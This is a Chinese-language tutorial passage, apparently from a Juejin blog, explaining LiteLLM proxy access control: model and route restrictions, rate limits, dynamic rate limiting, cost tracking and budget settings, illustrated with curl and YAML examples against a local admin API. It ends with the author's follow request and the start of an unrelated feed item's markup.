<li><strong>模型访问控制</strong>：控制用户可以使用哪些模型</li>
<li><strong>接口访问控制</strong>：控制用户可以调用哪些 API 接口</li>
<li><strong>配额管理</strong>：管理用户的请求频率、并发数、成本预算等资源使用限制</li>
</ol>
<p>下面我们从最基础的模型访问控制开始，逐步深入学习。</p>
<h2 data-id="heading-0">模型访问控制</h2>
<p>模型访问控制是 LiteLLM 访问控制的第一道防线，它决定了用户或团队是否可以使用特定的模型或模型组。</p>
<h3 data-id="heading-1">虚拟 Key 级别的模型限制</h3>
<p>最简单的模型访问控制方式是为虚拟 Key 指定允许的模型列表。其实我们之前在创建虚拟 Key 时已经用过，通过 <code>models</code> 参数来限制它可以访问的模型：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/key/generate'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "models": ["gpt-4o"],
    "metadata": {"user": "zhangsan@example.com"}
  }'</span>
</code></pre>
<p>生成的密钥只能调用 <code>gpt-4o</code> 这个模型，如果尝试调用其他模型，则会收到错误响应：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"error"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"key not allowed to access model. This key can only access models=['gpt-4o']. Tried to access deepseek"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"key_model_access_denied"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"param"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"model"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"401"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-2">团队级别的模型限制</h3>
<p>我们还可以为团队指定允许的模型列表。首先创建一个团队，并为其指定允许的模型：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/team/new'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "team_alias": "demo_team",
    "models": ["gpt-4o"]
  }'</span>
</code></pre>
<p>或者在 Admin UI 后台创建：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43a3c3c92814488aa5583e3361ac774d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pel5Lmg5LiA5oqA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764635843&amp;x-signature=G1sRSGmP80iBWjBrFPjLW8I%2FYv0%3D" alt="create-team.png" loading="lazy"/></p>
<p>然后为该团队创建虚拟 Key：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/key/generate'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "team_id": "950db486-fa2c-46e7-bfbc-3ac39e15fad2"
  }'</span>
</code></pre>
<p>此时，团队成员使用该密钥只能调用 <code>gpt-4o</code> 这个模型，当团队成员使用该密钥访问未授权模型时，LiteLLM 会返回错误信息：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"error"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"team not allowed to access model. This team can only access models=['gpt-4o']. Tried to access deepseek"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"team_model_access_denied"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"param"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"model"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"code"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"401"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<blockquote>
<p>注意，如果使用团队级别的模型限制，调用 <code>/key/generate</code> 时 <code>models</code> 参数是不生效的。</p>
</blockquote>
<p>同样地，我们也可以针对组织或用户来限制模型的访问，做法基本类似，调用 <code>/organization/new</code> 或 <code>/user/new</code> 时传入 <code>models</code> 参数即可，此处略过。</p>
<h3 data-id="heading-3">模型访问组</h3>
<p>对于需要动态管理模型访问权限的场景，LiteLLM 提供了 <strong>模型访问组</strong> 的功能，允许将多个模型组织成一个逻辑组，便于批量分配权限。</p>
<p>首先，在配置文件中定义模型访问组：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">model_list:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">model_name:</span> <span class="hljs-string">gpt-4o</span>
    <span class="hljs-attr">litellm_params:</span>
      <span class="hljs-attr">model:</span> <span class="hljs-string">openai/gpt-4o</span>
      <span class="hljs-attr">api_key:</span> <span class="hljs-string">os.environ/OPENAI_API_KEY</span>
    <span class="hljs-attr">model_info:</span>
      <span class="hljs-attr">access_groups:</span> [<span class="hljs-string">"beta-models"</span>]  <span class="hljs-comment"># 👈 模型访问组</span>

  <span class="hljs-bullet">-</span> <span class="hljs-attr">model_name:</span> <span class="hljs-string">claude</span>
    <span class="hljs-attr">litellm_params:</span>
      <span class="hljs-attr">model:</span> <span class="hljs-string">anthropic/claude-sonnet-4-20250514</span>
      <span class="hljs-attr">api_key:</span> <span class="hljs-string">os.environ/ANTHROPIC_API_KEY</span>
    <span class="hljs-attr">model_info:</span>
      <span class="hljs-attr">access_groups:</span> [<span class="hljs-string">"beta-models"</span>]  <span class="hljs-comment"># 👈 模型访问组</span>
</code></pre>
<p>然后，创建虚拟 Key 时指定访问组：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://localhost:4000/key/generate'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "models": ["beta-models"]
  }'</span>
</code></pre>
<p>这个 Key 可以访问所有标记为 <code>beta-models</code> 的模型，如果后续添加了新的模型到这个组，也会自动授权。模型访问组的主要优势在于：</p>
<ul>
<li><strong>动态管理</strong>：可以随时向访问组添加新模型，所有使用该组的用户自动获得访问权限</li>
<li><strong>批量操作</strong>：一次可以为多个用户分配相同的模型权限</li>
<li><strong>版本控制</strong>：可以创建不同的访问组用于不同环境（如 dev、staging、prod）</li>
</ul>
<p>对于需要更灵活访问控制的场景，LiteLLM 还支持通配符模型。你可以使用模式匹配来控制对具有特定前缀或后缀的模型的访问：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">model_list:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">model_name:</span> <span class="hljs-string">openai/*</span>
    <span class="hljs-attr">litellm_params:</span>
      <span class="hljs-attr">model:</span> <span class="hljs-string">openai/*</span>
      <span class="hljs-attr">api_key:</span> <span class="hljs-string">os.environ/OPENAI_API_KEY</span>
    <span class="hljs-attr">model_info:</span>
      <span class="hljs-attr">access_groups:</span> [<span class="hljs-string">"default-models"</span>]

  <span class="hljs-bullet">-</span> <span class="hljs-attr">model_name:</span> <span class="hljs-string">openai/o1-*</span>
    <span class="hljs-attr">litellm_params:</span>
      <span class="hljs-attr">model:</span> <span class="hljs-string">openai/o1-*</span>
      <span class="hljs-attr">api_key:</span> <span class="hljs-string">os.environ/OPENAI_API_KEY</span>
    <span class="hljs-attr">model_info:</span>
      <span class="hljs-attr">access_groups:</span> [<span class="hljs-string">"restricted-models"</span>]
</code></pre>
<p>根据配置，<code>default-models</code> 访问组的用户可以访问 <code>openai/gpt-4</code> 但不能访问 <code>openai/o1-mini</code>。</p>
<p>用户可以通过 <code>/v1/models</code> 接口查看自己有权访问的模型：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X GET <span class="hljs-string">'http://localhost:4000/v1/models'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-3zO1MHhHFme9aGXfWCiMXg'</span>
</code></pre>
<h2 data-id="heading-4">接口访问控制</h2>
<p>除了限制用户能调用哪些模型，LiteLLM 还支持限制用户能调用哪些 API 接口。</p>
<h3 data-id="heading-5">基于角色的接口权限</h3>
<p>在用户管理体系中，我们学习了基于角色的访问控制（RBAC），不同角色的用户自动拥有不同的接口权限：</p>
<ul>
<li><strong>代理管理员（Proxy Admin）</strong> 拥有所有接口的访问权限，包括：
<ul>
<li>用户管理接口：<code>/user/*</code></li>
<li>团队管理接口：<code>/team/*</code></li>
<li>密钥管理接口：<code>/key/*</code></li>
<li>组织管理接口：<code>/organization/*</code></li>
</ul>
</li>
<li><strong>内部用户（Internal User）</strong> 只能访问自己的密钥管理接口、自己的使用情况接口和 LLM 调用接口等</li>
<li><strong>团队成员（Team Member）</strong> 的接口权限由团队管理员精确控制，LiteLLM 支持对每个接口进行单独的权限配置。</li>
</ul>
<h3 data-id="heading-6">限制可调用的接口</h3>
<p>除此之外，在生成虚拟 Key 时我们还可以指定 <code>allowed_routes</code> 参数来限制用户能调用的接口：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/key/generate'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "models": ["gpt-4o"],
    "allowed_routes": ["/v1/chat/completions", "/v1/embeddings"]
  }'</span>
</code></pre>
<p>这样，这个 Key 就只能调用 <code>/v1/chat/completions</code> 和 <code>/v1/embeddings</code> 这两个接口，其他接口如获取模型列表、查询成本等都会被拒绝。</p>
<h2 data-id="heading-7">请求速率限制</h2>
<p>LiteLLM 支持三种类型的速率限制：</p>
<ul>
<li><strong>RPM（Requests Per Minute）</strong>：每分钟请求数限制</li>
<li><strong>TPM（Tokens Per Minute）</strong>：每分钟令牌数限制</li>
<li><strong>Max Parallel Requests</strong>：最大并发请求数限制</li>
</ul>
<p>我们可以在 <code>config.yaml</code> 文件中对指定模型进行全局限制：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">model_list:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">model_name:</span> <span class="hljs-string">gpt-4o</span>
    <span class="hljs-attr">litellm_params:</span>
      <span class="hljs-attr">model:</span> <span class="hljs-string">openai/gpt-4o</span>
      <span class="hljs-attr">api_key:</span> <span class="hljs-string">os.environ/OPENAI_API_KEY</span>
      <span class="hljs-attr">rpm:</span> <span class="hljs-number">10</span>
      <span class="hljs-attr">tpm:</span> <span class="hljs-number">10000</span>
</code></pre>
<p>或者在创建虚拟 Key 时加上这三个参数：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/key/generate'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "models": ["gpt-4o"],
    "rpm_limit": 3,
    "tpm_limit": 100,
    "max_parallel_requests": 1
  }'</span>
</code></pre>
<p>通过上面这个命令生成的 Key 每分钟最多只能发送 3 个请求，最多只能消耗 100 个 Token，并且同时最多只能有 1 个并发请求。</p>
<blockquote>
<p>值得注意的是，RPM 和 TPM 超过限制时，并不会报错，而是排队等待；只有并发数超过限制才会报 429 Too Many Requests 错误。</p>
</blockquote>
<p>如果虚拟 Key 对应多个模型，也可以为每个模型单独设置速率限制：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/key/generate'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "models": ["gpt-4o", "gpt-3.5-turbo"],
    "model_rpm_limit": {
      "gpt-4o": 30,
      "gpt-3.5-turbo": 100
    },
    "model_tpm_limit": {
      "gpt-4o": 5000,
      "gpt-3.5-turbo": 10000
    }
  }'</span>
</code></pre>
<blockquote>
<p>没有 <code>model_max_parallel_requests</code> 参数，暂时无法为每个模型单独设置并发路数。</p>
</blockquote>
<h3 data-id="heading-8">灵活的限制范围</h3>
<p>和模型限制一样，LiteLLM 也支持在组织、团队或内部用户上配置速率限制。其中团队级别的速率限制可以是针对整个团队的，也可以是针对团队内单个成员的：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://localhost:4000/team/new'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "team_alias": "demo_team",
    "rpm_limit": 100,    # 团队整体 RPM 限制
    "tpm_limit": 10000,  # 团队整体 TPM 限制
    "team_member_rpm_limit": 10,   # 单个成员 RPM 限制
    "team_member_tpm_limit": 1000  # 单个成员 TPM 限制
  }'</span>
</code></pre>
<p>值得注意的是，要启用团队成员速率限制，启动 LiteLLM 之前必须要设置环境变量 <code>EXPERIMENTAL_MULTI_INSTANCE_RATE_LIMITING=true</code>，如果不这样做，团队成员的速率限制将不会生效。</p>
<blockquote>
<p>当你部署多实例时，也需要设置这个环境变量。</p>
</blockquote>
<p>另外，速率限制还可以配置在终端用户上。LiteLLM 的用户分为两种：<strong>内部用户（Internal User）</strong> 和 <strong>终端用户（End User）</strong>，内部用户是管理和使用 LiteLLM 平台的内部人员，终端用户是通过 LiteLLM 平台获得 LLM 服务的外部用户，也被称为 <strong>客户（Customer）</strong>，他们没有自己的 API Key，在调用接口时通过 <code>user</code> 参数进行区分：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/chat/completions'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "user": "demo_customer",
    "model": "gpt-4o",
    "messages": [{"role": "user", "content": "你好"}]
  }'</span>
</code></pre>
<p>要对终端用户进行限流，需要先创建一个配额：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/budget/new'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "budget_id" : "free-tier",
    "rpm_limit": 3
  }'</span>
</code></pre>
<p>然后使用该配额创建一个终端用户：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 也可以使用 /end_user/new 接口</span>
$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/customer/new'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "user_id" : "demo_customer",
    "budget_id": "free-tier"
  }'</span>
</code></pre>
<p>这样就限制了这个终端用户一分钟只能请求 3 次。</p>
<h3 data-id="heading-9">动态速率限制</h3>
<p>在多个用户共享同一个模型部署的场景中，静态的速率限制可能导致资源分配不合理的情况。上文提到，速率限制可以配置在全局的配置文件中，假设我们给 A 模型限制了一分钟 60 次请求，如果某个用户突然疯狂发送请求，可能会导致其他用户的请求全部被限制。</p>
<p>为此，LiteLLM 提供了 <strong>动态速率限制</strong> 的功能，可以根据活跃密钥的数量动态分配 TPM/RPM 配额。</p>
<p>启用动态速率限制只需在配置文件中添加回调即可：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">model_list:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">model_name:</span> <span class="hljs-string">gpt-4o</span>
    <span class="hljs-attr">litellm_params:</span>
      <span class="hljs-attr">model:</span> <span class="hljs-string">openai/gpt-4o</span>
      <span class="hljs-attr">api_key:</span> <span class="hljs-string">os.environ/OPENAI_API_KEY</span>
      <span class="hljs-attr">rpm:</span> <span class="hljs-number">10</span> <span class="hljs-comment"># 全局 10 RPM</span>

<span class="hljs-attr">litellm_settings:</span>
  <span class="hljs-attr">callbacks:</span> [<span class="hljs-string">"dynamic_rate_limiter_v3"</span>]
</code></pre>
<p>它的工作原理是：</p>
<ol>
<li>计算当前活跃密钥数量</li>
<li>将模型的 TPM/RPM 配额平均分配给所有活跃密钥</li>
<li>定期调整分配比例以适应请求模式的变化</li>
</ol>
<p>因此，如果同时有 5 个 Key 在发送请求，每个 Key 都能得到 2 RPM 的配额（10/5）。如果只有 2 个 Key，每个能得到 5 RPM。这样就确保了资源的公平分配。</p>
<h3 data-id="heading-10">优先级预留</h3>
<p>对于更复杂的场景，还可以为不同的优先级预留资源。比如，生产环境的应用应该获得 90% 的资源，而开发环境只有 10% 的资源：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">litellm_settings:</span>
  <span class="hljs-attr">callbacks:</span> [<span class="hljs-string">"dynamic_rate_limiter_v3"</span>]
  <span class="hljs-attr">priority_reservation:</span>
    <span class="hljs-attr">"prod":</span> <span class="hljs-number">0.9</span>        <span class="hljs-comment"># 生产环境：90%</span>
    <span class="hljs-attr">"dev":</span> <span class="hljs-number">0.1</span>         <span class="hljs-comment"># 开发环境：10%</span>
  <span class="hljs-attr">priority_reservation_settings:</span>
    <span class="hljs-attr">default_priority:</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># 未指定优先级的：0%</span>
    <span class="hljs-attr">saturation_threshold:</span> <span class="hljs-number">0.5</span>  <span class="hljs-comment"># 模型使用率达到 50% 时启用严格模式（非严格模式下，使用率可以超出限制）</span>
</code></pre>
<p>创建 Key 时指定优先级：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/key/generate'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "models": ["gpt-4o"],
    "metadata": {"priority": "prod"}
  }'</span>
</code></pre>
<p>标记为 <code>prod</code> 的 Key 会优先获得资源，LiteLLM 会确保这个 Key 至少获得 90% 的使用率，而标记为 <code>dev</code> 的 Key 只能获得 10% 的使用率。</p>
<h2 data-id="heading-11">成本追踪</h2>
<p>我们在学习 LiteLLM 的模型管理时曾经提到过，LiteLLM 维护了一个完整的模型成本映射表，每次调用都会自动计算成本。默认情况下，成本是根据 <strong>输入和输出的 Token 数</strong> 乘以 <strong>模型的单位价格</strong> 来计算的：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">cost</span> = (input_tokens × input_cost_per_token) + (output_tokens × output_cost_per_token)
</code></pre>
<p>如果默认的价格不符合你的情况，可以在 <code>config.yaml</code> 中覆盖默认价格：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">model_list:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">model_name:</span> <span class="hljs-string">gpt-4o</span>
    <span class="hljs-attr">litellm_params:</span>
      <span class="hljs-attr">model:</span> <span class="hljs-string">openai/gpt-4o</span>
      <span class="hljs-attr">api_key:</span> <span class="hljs-string">os.environ/OPENAI_API_KEY</span>
    <span class="hljs-attr">model_info:</span>
      <span class="hljs-attr">input_cost_per_token:</span> <span class="hljs-number">0.00001</span>  <span class="hljs-comment"># 自定义价格</span>
      <span class="hljs-attr">output_cost_per_token:</span> <span class="hljs-number">0.00002</span>
</code></pre>
<blockquote>
<p>价格单位为 USD</p>
</blockquote>
<p>或者在全局设置中配置供应商折扣：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">cost_discount_config:</span>
  <span class="hljs-attr">openai:</span> <span class="hljs-number">0.1</span>         <span class="hljs-comment"># OpenAI 打 9 折</span>
  <span class="hljs-attr">anthropic:</span> <span class="hljs-number">0.15</span>     <span class="hljs-comment"># Anthropic 打 8.5 折</span>
  <span class="hljs-attr">vertex_ai:</span> <span class="hljs-number">0.2</span>      <span class="hljs-comment"># Vertex AI 打 8 折</span>
</code></pre>
<p>折扣会在成本计算后自动应用，LiteLLM 会返回原始成本和折扣后的成本。</p>
<p>成本追踪数据存储在数据库中，你可以通过多种方式查询：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查询单个 Key 的成本</span>
$ curl <span class="hljs-string">'http://127.0.0.1:4000/key/info?key=sk-xyz'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span>

<span class="hljs-comment"># 查询用户的总消费</span>
$ curl <span class="hljs-string">'http://127.0.0.1:4000/user/info?user_id=user-123'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span>

<span class="hljs-comment"># 查询团队的消费</span>
$ curl <span class="hljs-string">'http://127.0.0.1:4000/team/info?team_id=team-xyz'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span>

<span class="hljs-comment"># 生成成本报告（企业版特性）</span>
$ curl <span class="hljs-string">'http://127.0.0.1:4000/global/spend/report?start_date=2025-11-01&amp;end_date=2025-11-30&amp;group_by=team'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span>
</code></pre>
<p>LiteLLM 还支持<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.litellm.ai%2Fdocs%2Fproxy%2Fbilling" target="_blank" title="https://docs.litellm.ai/docs/proxy/billing" ref="nofollow noopener noreferrer">与计费系统集成</a>，比如可以自动将成本数据推送到 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.getlago.com%2Fwelcome" target="_blank" title="https://docs.getlago.com/welcome" ref="nofollow noopener noreferrer">Lago</a> 平台：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">litellm_settings:</span>
  <span class="hljs-attr">callbacks:</span> [<span class="hljs-string">"lago"</span>]
</code></pre>
<h2 data-id="heading-12">预算限制</h2>
<p>有了成本追踪，就能很容易实现预算限制了。LiteLLM 支持在多个层级设置预算限制，最直接的方式是在生成 Key 时设置 <code>max_budget</code>：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/key/generate'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "models": ["gpt-4o"],
    "max_budget": 100.0
  }'</span>
</code></pre>
<p>这个 Key 现在最多只能消耗 $100，一旦超过预算，后续的请求会被拒绝。</p>
<blockquote>
<p>或者通过 <code>soft_budget</code> 参数设置软预算限制，超过这个值时发送警告但不阻止请求。</p>
</blockquote>
<p>和请求速率限制类似，我们还可以为用户设置总预算，即使用户有多个 Key，这些 Key 的消费会统计到用户的总预算中；或者为团队设置总预算，团队下的所有成员使用的 Key 的消费都会累计到团队的总预算中；或者通过 <code>model_max_budget</code> 参数为不同模型设置不同预算；或者通过 <code>/budget/new</code> 创建配额，然后为终端用户设置总预算。</p>
<h3 data-id="heading-13">预算周期与自动重置</h3>
<p>有时候我们希望用户的预算能够定期重置。比如免费用户每个月重置 $10 的额度，这就需要用到 <code>budget_duration</code> 参数：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/key/generate'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "models": ["gpt-4o"],
    "max_budget": 10.0,
    "budget_duration": "30d"
  }'</span>
</code></pre>
<p>支持的时间周期包括：</p>
<ul>
<li><code>"30s"</code> - 30 秒</li>
<li><code>"30m"</code> - 30 分钟</li>
<li><code>"1h"</code> - 1 小时</li>
<li><code>"1d"</code> - 1 天</li>
<li><code>"30d"</code> - 30 天（一个月）</li>
</ul>
<h3 data-id="heading-14">临时预算增加</h3>
<p>有时候，用户由于突然的业务需求可能需要超出预算。对于这种场景，LiteLLM 支持临时预算增加功能：</p>
<pre><code class="hljs language-bash" lang="bash">curl -L -X POST <span class="hljs-string">'http://localhost:4000/key/update'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "key": "sk-your-key",
    "temp_budget_increase": 100,
    "temp_budget_expiry": "2025-11-30"
  }'</span>
</code></pre>
<p>临时预算增加也是一个企业特性，它有以下特点：</p>
<ul>
<li>固定过期时间，过期后自动失效</li>
<li>不影响原有的预算配置</li>
<li>支持多次临时增加</li>
<li>只能加在 API Key 上，无法为用户、团队、组织增加临时预算</li>
</ul>
<h3 data-id="heading-15">标签级别的预算</h3>
<p>对于需要跨多个维度跟踪成本的企业场景，LiteLLM 还支持按照 <strong>标签（Tag）</strong> 来分配预算，这对于按照功能、项目、成本中心来追踪成本特别有用：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/tag/new'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-1234'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "name": "marketing-chatbot",
    "description": "Marketing team chatbot",
    "max_budget": 200.0,
    "budget_duration": "30d"
  }'</span>
</code></pre>
<p>然后在请求时添加标签：</p>
<pre><code class="hljs language-bash" lang="bash">$ curl -X POST <span class="hljs-string">'http://127.0.0.1:4000/chat/completions'</span> \
  -H <span class="hljs-string">'Authorization: Bearer sk-xyz'</span> \
  -H <span class="hljs-string">'Content-Type: application/json'</span> \
  -d <span class="hljs-string">'{
    "model": "gpt-4o",
    "messages": [{"role": "user", "content": "hello"}],
    "metadata": {
      "tags": ["marketing-chatbot", "campaign-2024"]
    }
  }'</span>
</code></pre>
<h2 data-id="heading-16">小结</h2>
<p>LiteLLM 的访问控制机制构成了一个多维度的安全防护体系，从三个核心维度确保平台的稳定运行和成本可控：</p>
<ul>
<li><strong>访问范围控制</strong>：通过模型访问限制防止未授权模型使用，避免成本失控；模型访问组提供动态、批量化的权限管理能力；接口访问控制精确限制用户可调用的 API 端点；</li>
<li><strong>资源配额管理</strong>：通过 RPM、TPM、并发三种速率限制策略确保公平的资源分配；动态速率限制根据活跃用户数智能调整配额，避免资源浪费或抢占；优先级预留机制保障关键业务的资源需求；</li>
<li><strong>成本预算控制</strong>：实时成本追踪提供透明的费用可见性；多层级预算限制（Key/用户/团队/标签）满足不同场景需求；预算周期管理与临时预算增加提供灵活的额度控制；</li>
</ul>
<p>这套完整的访问控制体系不仅保障了 LiteLLM 网关的安全性，更通过精细化的资源管理和成本控制，为企业级 AI 应用提供了可靠的治理框架。合理配置这些机制，可以在保证用户体验的同时，最大化资源利用效率并控制运营成本。</p>
<h2 data-id="heading-17">欢迎关注</h2>
<p>如果这篇文章对您有所帮助，欢迎关注我的同名公众号：<a href="https://link.juejin.cn?target=https%3A%2F%2Fi-study-everyday.online%2Fabout-me.html" target="_blank" title="https://i-study-everyday.online/about-me.html" ref="nofollow noopener noreferrer">日习一技，每天学一点新技术</a>。</p>
<p>我会每天花一个小时，记录下我学习的点点滴滴。内容包括但不限于：</p>
<ul>
<li>某个产品的使用小窍门</li>
<li>开源项目的实践和心得</li>
<li>技术点的简单解读</li>
</ul>
<p>目标是让大家用5分钟读完就能有所收获，不需要太费劲，但却可以轻松获取一些干货。不管你是技术新手还是老鸟，欢迎给我提建议，如果有想学习的技术，也欢迎交流！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大数据-163 Apache Kylin Segment 合并实战：手动/自动合并、保留策略与 JDBC 示例]]></title>    <link>https://juejin.cn/post/7576086557717151795</link>    <guid>https://juejin.cn/post/7576086557717151795</guid>    <pubDate>2025-11-25T00:49:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576086557717151795" data-draft-id="7576105442214412338" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大数据-163 Apache Kylin Segment 合并实战：手动/自动合并、保留策略与 JDBC 示例"/> <meta itemprop="keywords" content="后端,大数据,Apache Kylin"/> <meta itemprop="datePublished" content="2025-11-25T00:49:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="武子康"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" 